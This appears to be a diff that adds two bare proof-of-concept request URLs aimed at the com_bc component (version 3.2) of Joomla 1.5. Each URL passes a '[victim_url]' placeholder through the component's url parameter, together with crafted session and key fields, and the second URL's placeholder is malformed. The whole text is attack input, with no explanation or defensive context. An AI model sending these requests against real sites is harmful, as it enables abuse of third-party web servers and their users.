@@ -1,0 +1,3 @@
+http://www.example.com/index2.php?option=com_bc&no_html=1&task=load&ctask=enter&d=1&url=[victim_url]&intraid=[]&userid=0&usergid=0&nick=&rid=0&rsid=0&lang=english&nlang=en-GB&template=system&pub_key=[]&&sec_code=[]&time_key=2010-08-11%2003:46:00&bcItemid=&bc_ver=3.2&prod=Joomla!&rel=1.5&dev=20&detaching=1
+
+http://www.example.com/index2.php?option=com_bc&no_html=1&task=client&ctask=enter&d=0c39e7&url=[victim_url&intraid=[]&userid=0&usergid=0&nick=&rid=0&rsid=0&lang=english&nlang=en-GB&template=system&pub_key=[]&sec_code=[]&time_key=2010-08-11%2018:45:20&bcItemid=&bc_ver=3.2&prod=Joomla!&rel=1.5&dev=7
